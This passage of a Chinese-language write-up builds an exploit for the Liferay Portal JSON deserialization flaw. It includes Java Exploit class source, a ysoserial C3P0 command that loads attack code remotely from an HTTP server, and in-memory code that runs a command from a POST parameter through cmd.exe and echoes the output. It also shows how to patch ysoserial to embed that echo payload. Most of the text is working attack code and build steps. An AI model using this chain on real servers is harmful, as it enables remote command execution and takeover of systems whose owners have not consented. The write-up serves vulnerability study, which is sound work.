                }
            }
            return matched;
        }
所以POST参数名称可以根据路由中参数确定
**2\. 构造defaultData**
根据前面的分析defaultData包含了json反序列的对象以及之后的利用链，首先清楚的是jodd序列化格式
    {"userOverridesAsString":"HexAsciiSerializedMap:xxxx"}
给上述字符串指定个类型，在json反序列化的时候就会在指定的类中执行setuserOverridesAsString方法参数为后面的value
## 0x04 payload编写
最后分析怎么编写payload，同时也是本篇文章分析的重点
###  0x1 出网payload
**（1）编译Java代码**
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.io.Reader;
    import javax.print.attribute.standard.PrinterMessageFromOperator;
    public class Exploit{
        public Exploit() throws IOException,InterruptedException{
            String cmd="calc.exe";
            final Process process = Runtime.getRuntime().exec(cmd);
            printMessage(process.getInputStream());;
            printMessage(process.getErrorStream());
            int value=process.waitFor();
            System.out.println(value);
        }
        private static void printMessage(final InputStream input) {
            // TODO Auto-generated method stub
            new Thread (new Runnable() {
                @Override
                public void run() {
                    // TODO Auto-generated method stub
                    Reader reader =new InputStreamReader(input);
                    BufferedReader bf = new BufferedReader(reader);
                    String line = null;
                    try {
                        while ((line=bf.readLine())!=null)
                        {
                            System.out.println(line);
                        }
                    }catch (IOException  e){
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }
命令行编译class文件
    /Library/Java/JavaVirtualMachines/jdk1.8.0_112.jdk/Contents/Home/bin/javac Exploit.java
**（2） 生成payload**
ysoserial 生成c3p0 远程调用payload，将1.ser的十六进制字符串放到HexAsciiSerializedMap 后面
    java -jar ysoserial.jar C3P0 "http://127.0.0.1:8089/:Exploit" > 1.ser
**（3） 开启web服务**
将编译好的Exploit.class 放在web目录下并开启服务
###  0x2 不出网回显payload
将此方法详细的介绍下，在去年shiro反序列化漏洞出来的时候师傅们研究了各种中间件的不出网回显的利用方法。该方法的核心在于找到位于thread中的Request和Response
，从而可以在Request获取头部信息，在Response中写入回显结果。我们这次的回显对象是Liferay
因此就要在该代码中找到存储请求和相应对象的类方法。
**1\. Request和Response**
我们可以通过liferay代码（JSONWebServiceServiceAction）分析得到其请求响应类ProtectedServletRequest
继承tomcat中的javax.servlet.http.HttpServletRequest，具体关系如下图所示：  
 **Request**
通过类关系图可以看出
**Response**
根据上面的关系图，我们就有了相应的目标，怎么从liferay中获取到ProtectedServletRequest对象呢？从下图中找到答案，AccessControlContext
定义了_httpServletRequest 和 _httpServletResponse属性以及getRequest和getResponse成员方法。
因此我们可以采用以下方式获取目标的servlet 请求相应
    httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();
    httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();
**2\. 调试payload的方法**
编写这块回显代码的时候不可能盲写，也是需要一定的调试技巧的，我们首先吧程序断在触发漏洞的地方，之后通过Evaluate Expression 编写代码
通过Evaluate后的代码只能是最后一个java语句的返回值如上图所示。最后利用这个方法写了个从POST参数获取命令，之后用回显的方式输出
    javax.servlet.http.HttpServletResponse httpServletResponse;
    javax.servlet.http.HttpServletRequest httpServletRequest;
    httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();
    httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();
    java.io.Writer writer = httpServletResponse.getWriter();
    String cmd = httpServletRequest.getParameter("4ct10n");
    String[] cmds =  new String[]{"cmd.exe", "/c", cmd};
    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
    String output = s.hasNext() ? s.next() : "";
    writer.write(output);
    writer.flush();
正则表达式”\A”跟”^”的作用是一样的，代表文本的开头，useDelimiter(“\a”) 代表获取所有的输出内容
**3\. 与ysoserial整合**
在Evaluate 中写好回显代码之后要与ysoseial工具进行整合，从而生成相对应的利用链payload，
**（1）在Gadgets.java 中添加代码**
    String cmd =
        "            javax.servlet.http.HttpServletResponse httpServletResponse;\n" +
        "            javax.servlet.http.HttpServletRequest httpServletRequest;\n" +
        "                httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();\n" +
        "                httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();\n" +
        "            java.io.Writer writer = httpServletResponse.getWriter();\n" +
        "                String cmd = httpServletRequest.getParameter("xxx");\n" +
        "                String[] cmds = new String[]{"cmd.exe", "/c", cmd};\n" +
        "                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
        "                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\\\a");\n" +
        "                String output = s.hasNext() ? s.next() : "";\n"  +
        "            writer.write(output);\n" +
        "            writer.flush();\n";
利用上面的代码替换掉原来的cmd代码
**（2） 添加依赖并编译**
在使用ClassPool类将回显代码加入到反序列化链的时候，ysoserial会先将这段代码编译成字节码，因此在编译的过程中需要将portal-kernel.jar 添加到mvn的依赖包中，操作如下：
在ysoserial项目的pom.xml文件中添加com.liferay.portal.kernel
      com.liferay.portal
      com.liferay.portal.kernel
      3.39.0
之后通过该指令生成反序列化paylaod ，将1.txt的二进制自负转换成十六进制之后再使用  
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 sss > 1.txt
**4\. 发送payload**
## 总结
完整的学习去年liferay漏洞的触发和利用，特别是在反序列化回显利用方面学习到了很多，膜拜各位师傅们的操作，作为萌新的我只能慢慢理解其中的精髓，有机会分析关于JSON反序列化利用的相关知识以及关于反序列化回显的细节。
## 参考文章